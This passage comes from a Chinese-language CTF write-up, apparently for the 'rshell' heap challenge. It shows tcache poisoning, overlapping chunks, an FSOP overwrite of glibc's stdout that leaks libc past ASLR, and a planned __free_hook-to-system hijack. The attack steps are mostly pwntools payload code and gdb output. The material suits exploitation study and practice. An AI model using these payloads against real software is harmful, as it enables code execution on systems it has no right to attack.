在这里做同样的事情，尽管这次有另一个块，在偷取指针的那个块和有那个指针的那个块之间。最后，留下了两个重叠块的句柄。假块报告的大小是0xa1(尽管不能在这个程序中创建那么大的块)，另一个是在它能够写入这个块之前。

``` bash
-----------------------------------
[0x000055555555c3b0] B       : x
[0x000055555555c3e0] fake2   : 
-----------------------------------
0x55555555c3a0: 0x0000000000000000      0x0000000000000081  <-- B meta
0x55555555c3b0: 0x0000000000000a78      0x0000000000000000
0x55555555c3c0: 0x0000000000000000      0x0000000000000000
0x55555555c3d0: 0x0000000000000000      0x00000000000000a1  <-- fake2 meta
0x55555555c3e0: 0x0000000000000000      0x0000000000000000
0x55555555c3f0: 0x0000000000000000      0x0000000000000000
0x55555555c400: 0x0000000000000000      0x0000000000000000
0x55555555c410: 0x0000000000000000      0x0000000000000000
0x55555555c420: 0x0000000000000000      0x0000000000000031  <-- E meta
-----------------------------------
...[snip]...
                  top: 0x55555555c490 (size : 0x20b70) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0](1): 0x55555555c2e0
(0x30)   tcache_entry[1](3): 0x55555555c430 --> 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )
(0x40)   tcache_entry[2](2): 0x55555555c460 --> 0x55555555c300
(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )
(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )
```

 - 得到未分类的bin

这允许做的是释放fake2，然后使用B来更改密钥，然后再次释放它。将总共释放它8次，前7次进入tcache，最后一次进入未排序的bins，这将把双链表指针留在堆上。还需要确保一个元数据后面的0xa0字节是一个有效的元数据，这就是为什么当创建E时，在里面喷洒了很多0x21字节。

``` bash
# 释放fake来填充tcache, 然后从保护双重free覆盖key
for i in range(7):
    edit('fake2', 0x0)    # 空闲的假块，把3e0放到0xa0 tcache中
    edit('B', 0x70, p64(0)*5 + p64(0xa1) + p64(0) + chr(i).encode()) # B

rm('B') # B
rm('fake2')
```

现在打开了两个文件，栈上有一个libc地址:

``` bash
-----------------------------------
[0x0000000000000000]         : (null)
[0x0000000000000000]         : (null)
-----------------------------------
0x55555555c3a0: 0x0000000000000000      0x0000000000000081
0x55555555c3b0: 0x0000000000000000      0x000055555555c010
0x55555555c3c0: 0x0000000000000000      0x0000000000000000
0x55555555c3d0: 0x0000000000000000      0x00000000000000a1
0x55555555c3e0: 0x00007ffff7fc3ca0      0x00007ffff7fc3ca0  <-- libc meta
0x55555555c3f0: 0x0000000000000000      0x0000000000000000
0x55555555c400: 0x0000000000000000      0x0000000000000000
0x55555555c410: 0x0000000000000000      0x0000000000000000
0x55555555c420: 0x0000000000000000      0x0000000000000031
-----------------------------------
                  top: 0x55555555c490 (size : 0x20b70) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x55555555c3d0 (overlap chunk with 0x55555555c420(freed) )
(0x20)   tcache_entry[0](1): 0x55555555c2e0
(0x30)   tcache_entry[1](3): 0x55555555c430 --> 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )
(0x40)   tcache_entry[2](2): 0x55555555c460 --> 0x55555555c300
(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )
(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )
(0x80)   tcache_entry[6](1): 0x55555555c3b0
(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c420(freed) )  <-- actually 7 in there, but only shows once
```

 - 这个指针是什么?

让gdb打印这个地址显示它在main_arena:

``` bash
(gdb) x/xg 0x00007ffff7fc3ca0
0x7ffff7fc3ca0 <main_arena+96>: 0x000055555555c490
```

[这篇文章](http://core-analyzer.sourceforge.net/index_files/Page335.html)很好地解释了main_arena是什么:

***库glibc有一个全局的“struct malloc_state”对象，名为main_arena，它是所有托管堆内存的root。***

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ropetwo-rshell.jpg)

gdb显示了它如何包含堆中使用的所有不同指针的:

``` bash
(gdb) p main_arena
$1 = {mutex = 0, flags = 0, have_fastchunks = 0, fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, top = 0x55555555c490, last_remainder = 0x0, bins = {0x55555555c3d0, 0x55555555c3d0, 0x7ffff7fc3cb0 <main_arena+112>, 0x7ffff7fc3cb0 <main_arena+112>, 0x7ffff7fc3cc0 <main_arena+128>, 0x7ffff7fc3cc0 <main_arena+128>, 0x7ffff7fc3cd0 <main_arena+144>, 0x7ffff7fc3cd0 <main_arena+144>, 0x7ffff7fc3ce0 <main_arena+160>, 0x7ffff7fc3ce0 <main_arena+160>, 0x7ffff7fc3cf0 <main_arena+176>, 0x7ffff7fc3cf0 <main_arena+176>, 0x7ffff7fc3d00 <main_arena+192>, 0x7ffff7fc3d00 <main_arena+192>, 0x7ffff7fc3d10 <main_arena+208>, 0x7ffff7fc3d10 <main_arena+208>, 0x7ffff7fc3d20 <main_arena+224>, 0x7ffff7fc3d20 <main_arena+224>, 0x7ffff7fc3d30 <main_arena+240>, 0x7ffff7fc3d30 <main_arena+240>, 0x7ffff7fc3d40 <main_arena+256>, 0x7ffff7fc3d40 <main_arena+256>, 0x7ffff7fc3d50 <main_arena+272>, 0x7ffff7fc3d50 <main_arena+272>, 0x7ffff7fc3d60 <main_arena+288>, 0x7ffff7fc3d60 <main_arena+288>, 0x7ffff7fc3d70 <main_arena+304>, 0x7ffff7fc3d70 <main_arena+304>, 0x7ffff7fc3d80 <main_arena+320>, 0x7ffff7fc3d80 <main_arena+320>, 0x7ffff7fc3d90 <main_arena+336>, 0x7ffff7fc3d90 <main_arena+336>, 0x7ffff7fc3da0 <main_arena+352>, 0x7ffff7fc3da0 <main_arena+352>, 0x7ffff7fc3db0 <main_arena+368>, 0x7ffff7fc3db0 <main_arena+368>, 0x7ffff7fc3dc0 <main_arena+384>, 0x7ffff7fc3dc0 <main_arena+384>, 0x7ffff7fc3dd0 <main_arena+400>, 0x7ffff7fc3dd0 <main_arena+400>, 0x7ffff7fc3de0 <main_arena+416>, 0x7ffff7fc3de0 <main_arena+416>, 0x7ffff7fc3df0 <main_arena+432>, 0x7ffff7fc3df0 <main_arena+432>, 0x7ffff7fc3e00 <main_arena+448>, 0x7ffff7fc3e00 <main_arena+448>, 0x7ffff7fc3e10 <main_arena+464>, 0x7ffff7fc3e10 <main_arena+464>, 0x7ffff7fc3e20 <main_arena+480>, 0x7ffff7fc3e20 <main_arena+480>, 0x7ffff7fc3e30 <main_arena+496>, 0x7ffff7fc3e30 <main_arena+496>, 0x7ffff7fc3e40 <main_arena+512>, 0x7ffff7fc3e40 <main_arena+512>, 0x7ffff7fc3e50 <main_arena+528>, 0x7ffff7fc3e50 <main_arena+528>, 0x7ffff7fc3e60 <main_arena+544>, 0x7ffff7fc3e60 <main_arena+544>, 0x7ffff7fc3e70 <main_arena+560>, 0x7ffff7fc3e70 <main_arena+560>, 0x7ffff7fc3e80 <main_arena+576>, 0x7ffff7fc3e80 <main_arena+576>, 0x7ffff7fc3e90 <main_arena+592>, 0x7ffff7fc3e90 <main_arena+592>, 0x7ffff7fc3ea0 <main_arena+608>, 0x7ffff7fc3ea0 <main_arena+608>, 0x7ffff7fc3eb0 <main_arena+624>, 0x7ffff7fc3eb0 <main_arena+624>, 0x7ffff7fc3ec0 <main_arena+640>, 0x7ffff7fc3ec0 <main_arena+640>, 0x7ffff7fc3ed0 <main_arena+656>, 0x7ffff7fc3ed0 <main_arena+656>, 0x7ffff7fc3ee0 <main_arena+672>, 0x7ffff7fc3ee0 <main_arena+672>, 0x7ffff7fc3ef0 <main_arena+688>, 0x7ffff7fc3ef0 <main_arena+688>, 0x7ffff7fc3f00 <main_arena+704>, 0x7ffff7fc3f00 <main_arena+704>, 0x7ffff7fc3f10 <main_arena+720>, 0x7ffff7fc3f10 <main_arena+720>, 0x7ffff7fc3f20 <main_arena+736>, 0x7ffff7fc3f20 <main_arena+736>, 0x7ffff7fc3f30 <main_arena+752>, 0x7ffff7fc3f30 <main_arena+752>, 0x7ffff7fc3f40 <main_arena+768>, 0x7ffff7fc3f40 <main_arena+768>, 0x7ffff7fc3f50 <main_arena+784>, 0x7ffff7fc3f50 <main_arena+784>, 0x7ffff7fc3f60 <main_arena+800>, 0x7ffff7fc3f60 <main_arena+800>, 0x7ffff7fc3f70 <main_arena+816>, 0x7ffff7fc3f70 <main_arena+816>, 0x7ffff7fc3f80 <main_arena+832>, 0x7ffff7fc3f80 <main_arena+832>, 0x7ffff7fc3f90 <main_arena+848>, 0x7ffff7fc3f90 <main_arena+848>, 0x7ffff7fc3fa0 <main_arena+864>, 0x7ffff7fc3fa0 <main_arena+864>, 0x7ffff7fc3fb0 <main_arena+880>, 0x7ffff7fc3fb0 <main_arena+880>, 0x7ffff7fc3fc0 <main_arena+896>, 0x7ffff7fc3fc0 <main_arena+896>, 0x7ffff7fc3fd0 <main_arena+912>, 0x7ffff7fc3fd0 <main_arena+912>, 0x7ffff7fc3fe0 <main_arena+928>, 0x7ffff7fc3fe0 <main_arena+928>, 0x7ffff7fc3ff0 <main_arena+944>, 0x7ffff7fc3ff0 <main_arena+944>, 0x7ffff7fc4000 <main_arena+960>, 0x7ffff7fc4000 <main_arena+960>, 0x7ffff7fc4010 <main_arena+976>, 0x7ffff7fc4010 <main_arena+976>, 0x7ffff7fc4020 <main_arena+992>, 0x7ffff7fc4020 <main_arena+992>, 0x7ffff7fc4030 <main_arena+1008>, 0x7ffff7fc4030 <main_arena+1008>, 0x7ffff7fc4040 <main_arena+1024>, 0x7ffff7fc4040 <main_arena+1024>, 0x7ffff7fc4050 <main_arena+1040>, 0x7ffff7fc4050 <main_arena+1040>, 0x7ffff7fc4060 <main_arena+1056>, 0x7ffff7fc4060 <main_arena+1056>, 0x7ffff7fc4070 <main_arena+1072>, 0x7ffff7fc4070 <main_arena+1072>, 0x7ffff7fc4080 <main_arena+1088>, 0x7ffff7fc4080 <main_arena+1088>, 0x7ffff7fc4090 <main_arena+1104>, 0x7ffff7fc4090 <main_arena+1104>, 0x7ffff7fc40a0 <main_arena+1120>, 0x7ffff7fc40a0 <main_arena+1120>, 0x7ffff7fc40b0 <main_arena+1136>, 0x7ffff7fc40b0 <main_arena+1136>, 0x7ffff7fc40c0 <main_arena+1152>, 0x7ffff7fc40c0 <main_arena+1152>, 0x7ffff7fc40d0 <main_arena+1168>, 0x7ffff7fc40d0 <main_arena+1168>, 0x7ffff7fc40e0 <main_arena+1184>, 0x7ffff7fc40e0 <main_arena+1184>, 0x7ffff7fc40f0 <main_arena+1200>, 0x7ffff7fc40f0 <main_arena+1200>, 0x7ffff7fc4100 <main_arena+1216>, 0x7ffff7fc4100 <main_arena+1216>, 0x7ffff7fc4110 <main_arena+1232>, 0x7ffff7fc4110 <main_arena+1232>, 0x7ffff7fc4120 <main_arena+1248>, 0x7ffff7fc4120 <main_arena+1248>, 0x7ffff7fc4130 <main_arena+1264>, 0x7ffff7fc4130 <main_arena+1264>, 0x7ffff7fc4140 <main_arena+1280>, 0x7ffff7fc4140 <main_arena+1280>, 0x7ffff7fc4150 <main_arena+1296>, 0x7ffff7fc4150 <main_arena+1296>, 0x7ffff7fc4160 <main_arena+1312>, 0x7ffff7fc4160 <main_arena+1312>, 0x7ffff7fc4170 <main_arena+1328>, 0x7ffff7fc4170 <main_arena+1328>, 0x7ffff7fc4180 <main_arena+1344>, 0x7ffff7fc4180 <main_arena+1344>, 0x7ffff7fc4190 <main_arena+1360>, 0x7ffff7fc4190 <main_arena+1360>, 0x7ffff7fc41a0 <main_arena+1376>, 0x7ffff7fc41a0 <main_arena+1376>, 0x7ffff7fc41b0 <main_arena+1392>, 0x7ffff7fc41b0 <main_arena+1392>, 0x7ffff7fc41c0 <main_arena+1408>, 0x7ffff7fc41c0 <main_arena+1408>, 0x7ffff7fc41d0 <main_arena+1424>, 0x7ffff7fc41d0 <main_arena+1424>, 0x7ffff7fc41e0 <main_arena+1440>, 0x7ffff7fc41e0 <main_arena+1440>, 0x7ffff7fc41f0 <main_arena+1456>, 0x7ffff7fc41f0 <main_arena+1456>, 0x7ffff7fc4200 <main_arena+1472>, 0x7ffff7fc4200 <main_arena+1472>, 0x7ffff7fc4210 <main_arena+1488>, 0x7ffff7fc4210 <main_arena+1488>, 0x7ffff7fc4220 <main_arena+1504>, 0x7ffff7fc4220 <main_arena+1504>, 0x7ffff7fc4230 <main_arena+1520>, 0x7ffff7fc4230 <main_arena+1520>, 0x7ffff7fc4240 <main_arena+1536>, 0x7ffff7fc4240 <main_arena+1536>, 0x7ffff7fc4250 <main_arena+1552>, 0x7ffff7fc4250 <main_arena+1552>, 0x7ffff7fc4260 <main_arena+1568>, 0x7ffff7fc4260 <main_arena+1568>, 0x7ffff7fc4270 <main_arena+1584>, 0x7ffff7fc4270 <main_arena+1584>, 0x7ffff7fc4280 <main_arena+1600>, 0x7ffff7fc4280 <main_arena+1600>, 0x7ffff7fc4290 <main_arena+1616>, 0x7ffff7fc4290 <main_arena+1616>, 0x7ffff7fc42a0 <main_arena+1632>, 0x7ffff7fc42a0 <main_arena+1632>, 0x7ffff7fc42b0 <main_arena+1648>, 0x7ffff7fc42b0 <main_arena+1648>, 0x7ffff7fc42c0 <main_arena+1664>, 0x7ffff7fc42c0 <main_arena+1664>, 0x7ffff7fc42d0 <main_arena+1680>, 0x7ffff7fc42d0 <main_arena+1680>...}, binmap = {0, 0, 0, 0}, next = 0x7ffff7fc3c40 <main_arena>, next_free = 0x0, attached_threads = 1, system_mem = 135168, max_system_mem = 135168}
```

#### 泄露Libc

 - FSOP泄露

使用一种名为面向文件系统编程(FSOP)的技术来泄漏libc地址。FSOP的思想是攻击文件流对象的GLIBC实现。这篇[2018年的论文](https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf)详细介绍了文件流和文件对象结构。如果程序自己创建了一个用fopen打开的文件，就能找到那个结构并打乱它。文件对象中还有函数指针，可以覆盖它们以执行代码。但还不能这样做，因为还不知道应该写什么地址。

所能做的是找到并覆盖_flag和_IO_write_base指针，以便在写入该文件流的下一个操作中写入其他内容。

当然，所有这些都假设有一个FILE对象。stdin和stdout是保存在LIBC空间中的文件对象。因为使用的libc带有debug符号，可以通过名称打印stdout，并使用&获得地址:

``` bash
(gdb) p _IO_2_1_stdout_
$3 = {file = {_flags = -72537977, _IO_read_ptr = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_read_end = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_read_base = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_write_base = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_write_ptr = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_write_end = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_buf_base = 0x7ffff7fc47e3 <_IO_2_1_stdout_+131> "\n", _IO_buf_end = 0x7ffff7fc47e4 <_IO_2_1_stdout_+132> "", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7fc3a00 <_IO_2_1_stdin_>, _fileno = 1, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "\n", _lock = 0x7ffff7fc6580 <_IO_stdfile_1_lock>, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7fc38c0 <_IO_wide_data_1>, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = '\000' <repeats 19 times>}, vtable = 0x7ffff7fc5560 <__GI__IO_file_jumps>}

(gdb) p &_IO_2_1_stdout_
$2 = (struct _IO_FILE_plus *) 0x7ffff7fc4760 <_IO_2_1_stdout_>
```

因此，如果可以将_IO_write_base更改为_IO_write_end之前的某个值，将诱使stdout认为内容已被缓存并等待发送。当前指针是0x7ffff7fc47e3。如果只写一个空字节，那么它将是0x7ffff7fc4700:

``` bash
(gdb) x/12xg 0x00007ffff7fc4700
0x7ffff7fc4700 <_IO_2_1_stderr_+128>:   0x0000000000000000      0x00007ffff7fc6570
0x7ffff7fc4710 <_IO_2_1_stderr_+144>:   0xffffffffffffffff      0x0000000000000000
0x7ffff7fc4720 <_IO_2_1_stderr_+160>:   0x00007ffff7fc3780      0x0000000000000000
0x7ffff7fc4730 <_IO_2_1_stderr_+176>:   0x0000000000000000      0x0000000000000000
0x7ffff7fc4740 <_IO_2_1_stderr_+192>:   0x0000000000000000      0x0000000000000000
0x7ffff7fc4750 <_IO_2_1_stderr_+208>:   0x0000000000000000      0x00007ffff7fc5560
```

如果打印过来，就会泄露libc绕过ASLR。

 - 改变指向_IO_2_1_stdout的指针

当最后结束时，已经将main_arena中的这个指针写到堆中，并设法释放了两个“文件”。也可以访问一个重叠块之前的main_arena指针:

``` bash
0x55555555c3a0: 0x0000000000000000      0x0000000000000081  <-- chunk B, currently in tcache
0x55555555c3b0: 0x0000000000000000      0x000055555555c010
0x55555555c3c0: 0x0000000000000000      0x0000000000000000
0x55555555c3d0: 0x0000000000000000      0x00000000000000a1
0x55555555c3e0: 0x00007ffff7fc3ca0      0x00007ffff7fc3ca0  <-- libc meta
0x55555555c3f0: 0x0000000000000000      0x0000000000000000
0x55555555c400: 0x0000000000000000      0x0000000000000000
0x55555555c410: 0x0000000000000000      0x0000000000000000
0x55555555c420: 0x0000000000000000      0x0000000000000031
```

想写0x7ffff7fc4760。将获取B，并使用它修改libc地址的低两个字节，指向_IO_2_1_stdout_:

``` bash
add('B', 0x70)
edit('B', 0x70, p64(0)*5 + p64(0xa1) + b"\x60\x47")
rm('B')
```

现在在堆上有了想要写入的地址:

``` bash
0x55555555c3a0: 0x0000000000000000      0x0000000000000081
0x55555555c3b0: 0x0000000000000000      0x000055555555c010
0x55555555c3c0: 0x0000000000000000      0x0000000000000000
0x55555555c3d0: 0x0000000000000000      0x00000000000000a1
0x55555555c3e0: 0x00007ffff7fc4760      0x00007ffff7fc3ca0  <-- now points to stdout
```

当发现启用了ASLR时，这可能会失败。这是因为地址的低三个字节(0x760)是一致的，高一点的字节(在本例中是4)将改变ASLR。一旦它正常工作，就会打开ASLR，这样它答对的概率就会是1/16, 6.25% 尽管如此，仍然可以反复进行攻击，所以在10次尝试中，有50%的几率成功，在20次尝试中，我有75%的几率成功。将更新脚本以循环失败。

 - 定位写到_IO_2_1_stdout

现在，想在这个结构上创建一个块，将使用与以前相同的tcache毒化技术。经过一堆重写，设法达到这一点的tcache看起来像:

``` bash
(0x20)   tcache_entry[0](1): 0x55555555c2e0                                                                               
(0x30)   tcache_entry[1](3): 0x55555555c430 --> 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )                
(0x40)   tcache_entry[2](2): 0x55555555c460 --> 0x55555555c300
(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )
(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )
(0x80)   tcache_entry[6](1): 0x55555555c3b0
(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c420(freed) )
```

如果目标地址在0x300s中，那么0x40 tcache bins看起来是一个很好的目标。将使用与上面相同的技巧编辑指针，在460处获取bin，将其编辑为0，使第二个文件指向它，释放第一个文件，以便在有一个句柄的时候它回到tcache中，然后编辑地址。

``` bash
add('F', 0x30)           # fetch 460 chunk from tcache, 300 still in 0x40 tcache
edit('F', 0)             # 460 -> 300 in 0x40 tcache, f1 -> 460 
add('F2', 0x30)          # f1 and f2 -> 460, 300 in 0x40 tcache
rm('F')                  # f2 -> 460, 460 -> 300 in 0x40 tcache
edit('F2', 0x30, '\xe0') # 460 -> 3e0 -> stdout in 0x40 tcache

# get 460 from tcahce, shrink it, and release it
add('F3', 0x30)
edit('F3', 0x10)
rm('F3')

# get 3e0 from tcache, shrink it, and release it
add('fake3', 0x30)
edit('fake3', 0x10)
rm('fake3')

# clean up F2
edit('F2', 0x10, p64(0)*2) # overwrtie pointer and key to allow double free
rm('F2')
```

此时，0x40 tcache列表指向_IO_2_1_stdout_:

``` bash
(0x40)   tcache_entry[2](0): 0x7ffff7fc4760 --> 0xfbad2887 (invalid memory)
```

 - 写_IO_2_1_stdout

如上所述，将攻击stdout的文件结构。在gdb中展示了上面的结构体，但[源代码](http://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libio.h;h=3cf1712ea98d3c253f418feb1ef881c4a44649d5;hb=HEAD#l245)也很有用:

``` bash
 245 struct _IO_FILE {
 246   int _flags;           /* High-order word is _IO_MAGIC; rest is flags. */
 247 #define _IO_file_flags _flags
 248 
 249   /* The following pointers correspond to the C++ streambuf protocol. */
 250   /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
 251   char* _IO_read_ptr;   /* Current read pointer */
 252   char* _IO_read_end;   /* End of get area. */
 253   char* _IO_read_base;  /* Start of putback+get area. */
 254   char* _IO_write_base; /* Start of put area. */
 255   char* _IO_write_ptr;  /* Current put pointer. */
 256   char* _IO_write_end;  /* End of put area. */
 257   char* _IO_buf_base;   /* Start of reserve area. */
 258   char* _IO_buf_end;    /* End of reserve area. */
 259   /* The following fields are used to support backing up and undo. */
 260   char *_IO_save_base; /* Pointer to start of non-current get area. */
 261   char *_IO_backup_base;  /* Pointer to first valid character of backup area */
 262   char *_IO_save_end; /* Pointer to end of non-current get area. */
...[snip]...
 285 #ifdef _IO_USE_OLD_IO_FILE
 286 };
```

将覆盖_flags、三个_IO_read_*地址和_IO_write_ptr的低字节。_flags在[这里](http://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libio.h;h=3cf1712ea98d3c253f418feb1ef881c4a44649d5;hb=HEAD#l86)定义:

``` bash
  92 #define _IO_MAGIC 0xFBAD0000 /* Magic number */
  93 #define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */
  94 #define _IO_MAGIC_MASK 0xFFFF0000
  95 #define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */
  96 #define _IO_UNBUFFERED 2
  97 #define _IO_NO_READS 4 /* Reading not allowed */
  98 #define _IO_NO_WRITES 8 /* Writing not allowed */
  99 #define _IO_EOF_SEEN 0x10
 100 #define _IO_ERR_SEEN 0x20
 101 #define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */
 102 #define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/
 103 #define _IO_IN_BACKUP 0x100
 104 #define _IO_LINE_BUF 0x200
 105 #define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */
 106 #define _IO_CURRENTLY_PUTTING 0x800
 107 #define _IO_IS_APPENDING 0x1000
 108 #define _IO_IS_FILEBUF 0x2000
 109 #define _IO_BAD_SEEN 0x4000
 110 #define _IO_USER_LOCK 0x8000
```

两个高字节将是0xfbad，这是该结构的神奇数字。对于底部的两个字节，将打开_io_currently_puts和_IO_IS_APPENDING。这些标记是在其他CTF文章中看到过的，在这里表明这些数据已经准备好了。

不认为在三个_IO_read_*字段中写什么是非常重要的，因为没有东西从stdout读取。然后，想要一个在_IO_write_ptr空字节的低字节。

将得到一个机会写到_IO_2_1_stdout_，因为调用edit将调用realloc，这将失败，因为它将发现意外的数据，它期待堆元。仔细观察add，它使用fgets，所以它将[读取到完整的大小，或者直到换行](http://www.cplusplus.com/reference/cstdio/fgets/)。因为不会写完整的大小，所以sendline的换行符会在那里。它还在输入的末尾追加一个null。

把所有这些放在一起，将创建如下的bin:

``` bash
add('stdout', 0x30, p64(0xfbad1800) + p64(0)*2 + b"\x00"*7)
```

 - 泄露

为了看到实际操作，将运行对_IO_2_1_stdout_的写入操作，然后附加gdb并在0x0000555555555b92处设置一个额外的断点。这是在添加完成之后，但在打印任何内容之前(一旦打印完成，文件中的所有指针都将被更新)。现在，将跳过Python脚本中的泄漏指令，gdb将达到这个断点。将检查_IO_2_1_stdout_:

``` bash
Breakpoint 2, 0x0000555555555b92 in ?? ()
(gdb) x/12xg &_IO_2_1_stdout_
0x7ffff7fc4760 <_IO_2_1_stdout_>:       0x00000000fbad1800      0x0000000000000000  <-- modified flags, null read ptr
0x7ffff7fc4770 <_IO_2_1_stdout_+16>:    0x0000000000000000      0x0a00000000000000  <-- null read end, null read base
0x7ffff7fc4780 <_IO_2_1_stdout_+32>:    0x00007ffff7fc4700      0x00007ffff7fc47e3  <-- low byte 0 for write ptr
0x7ffff7fc4790 <_IO_2_1_stdout_+48>:    0x00007ffff7fc47e3      0x00007ffff7fc47e3
0x7ffff7fc47a0 <_IO_2_1_stdout_+64>:    0x00007ffff7fc47e4      0x0000000000000000
0x7ffff7fc47b0 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
```

当允许继续这样做(并且通过在调用的末尾添加日志级别为DEBUG的Python脚本运行)，可以看到数据返回:

``` bash
[DEBUG] Sent 0xb bytes:
    b'add stdout\n'
[DEBUG] Received 0x6 bytes:
    b'size: '
[DEBUG] Sent 0x3 bytes:
    b'48\n'
[DEBUG] Received 0x9 bytes:
    b'content: '
[DEBUG] Sent 0x20 bytes:
    00000000  00 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│
    00000020
[DEBUG] Received 0xe5 bytes:
    00000000  00 00 00 00  00 00 00 00  70 65 fc f7  ff 7f 00 00  │····│····│pe··│····│
    00000010  ff ff ff ff  ff ff ff ff  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000020  80 37 fc f7  ff 7f 00 00  00 00 00 00  00 00 00 00  │·7··│····│····│····│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000050  00 00 00 00  00 00 00 00  60 55 fc f7  ff 7f 00 00  │····│····│`U··│····│
    00000060  00 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│
    00000080  00 47 fc f7  ff 7f 00 00  e3 47 fc f7  ff 7f 00 00  │·G··│····│·G··│····│
    00000090  e3 47 fc f7  ff 7f 00 00  e3 47 fc f7  ff 7f 00 00  │·G··│····│·G··│····│
    000000a0  e4 47 fc f7  ff 7f 00 00  00 00 00 00  00 00 00 00  │·G··│····│····│····│
    000000b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000c0  00 00 00 00  00 00 00 00  00 3a fc f7  ff 7f 00 00  │····│····│·:··│····│
    000000d0  01 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff ff  │····│····│····│····│
    000000e0  00 00 00 24  20                                     │···$│ │
    000000e5
```

跟之前看到的和预期的相符。可以从8-15字节中提取libc地址。

当第一次解决这个问题时，没有添加返回任何东西，但更新它返回任何返回的东西，所以可以捕捉它，并从它获得libc地址。

将查看这个地址和/proc/$(pidof rshell)/maps文件，以查看从它到libc基址的偏移量是0x1e7570。

 - 追加ASLR说明

前面提到过，这里有一些关于ASLR的问题。正在修改底部的两个字节(或四个字节)。但只知道想要的low three nibbles是什么。因此，在猜测第四点。有2^4 = 16个可能的值，所以1/16的机会是正确的，6.25%尽管如此，仍然可以反复进行攻击，所以在10次尝试中，我有50%的几率成功，在20次尝试中，有75%的几率成功。将更新脚本以循环失败。

#### 执行

 - 写到__free_hook

既然泄露了libc的消息，就可以被判死刑了。将用system覆盖__free_hook，然后释放一个包含"/bin/sh"的块。

遇到的第一个挑战是，不能释放指向_IO_2_1_stdout_的 “文件”，因为它将导致崩溃。这意味着从现在开始，只能使用一个文件。给出的第一个关于如何创建一个假块的例子实际上就是为这个做准备的。当最初到达这一点时，必须返回并在一开始添加它，以便它可以从这里获取(这意味着重新工作所有的间距等)。一旦这样做了，就达到了以下状态:

``` bash
-----------------------------------
[0x00007ffff7fc4760] stdout  : 
[0x0000000000000000]         : (null)
-----------------------------------
0x55555555c280: 0x0000000000000000      0x0000000000000061  <-- fake1 from start, in 0x60 tcache
0x55555555c290: 0x0000000000000000      0x000055555555c010
0x55555555c2a0: 0x0000000000000000      0x0000000000000051  <-- real chunk B from start, in 0x50 tcache
0x55555555c2b0: 0x0000000000000000      0x000055555555c010
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
0x55555555c2d0: 0x0000000000000000      0x0000000000000021
0x55555555c2e0: 0x0000000000000000      0x000055555555c010
0x55555555c2f0: 0x0000000000000000      0x0000000000000041
0x55555555c300: 0x0000000000000000      0x000055555555c010
0x55555555c310: 0x0000000000000000      0x0000000000000000
0x55555555c320: 0x0000000000000000      0x0000000000000000
0x55555555c330: 0x0000000000000000      0x0000000000000071
-----------------------------------
                  top: 0x55555555c490 (size : 0x20b70) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x55555555c3d0 (doubly linked list corruption 0x55555555c3d0 != 0x0 and 0x55555555c3d0 is broken)
(0x20)   tcache_entry[0](5): 0x55555555c460 --> 0x55555555c3e0 --> 0x55555555c460 (overlap chunk with 0x55555555c450(freed) )
(0x30)   tcache_entry[1](3): 0x55555555c430 --> 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )
(0x40)   tcache_entry[2](255): 0xfbad2887 (invalid memory)
(0x50)   tcache_entry[3](1): 0x55555555c2b0                                             <-- B
